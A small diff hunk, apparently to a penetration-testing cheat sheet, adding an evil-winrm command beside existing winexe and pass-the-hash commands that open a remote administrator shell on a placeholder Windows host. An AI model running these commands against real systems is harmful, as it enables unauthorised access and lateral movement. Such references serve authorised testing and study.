@@ -26,6 +26,7 @@ net localgroup "Remote Desktop Users" username /add
 ```sh
 winexe - U jenkins/administrator //xxx.xxx.xxx cmd.exe
 pth-winexe -U jenkins/administrator //xxx.xxx.xxx.xxx cmd.exe
+ruby evil-winrm.rb -i xxx.xxx.xxx.xxx -u username -p password
 ```
 
 Enable Remote Desktop:
